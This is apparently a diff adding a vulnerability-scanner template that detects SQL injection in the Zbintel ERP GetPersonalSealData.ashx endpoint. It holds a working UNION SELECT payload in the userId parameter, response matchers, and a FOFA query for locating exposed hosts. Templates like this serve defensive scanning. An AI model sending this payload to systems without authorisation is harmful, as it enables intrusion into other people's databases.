@@ -1,0 +1,29 @@
+id: zbintel-erp-getpersonalsealdata-sqli
+info:
+  name: Zbintel ERP GetPersonalSealData.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in the Zbintel ERP GetPersonalSealData.ashx endpoint.
+  metadata:
+    finger: Zbintel ERP
+    fofa-query: icon_hash="-682445886"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"SealData\""
+          - "Microsoft SQL Server"
+      - type: word
+        part: header
+        words:
+          - "application/json"
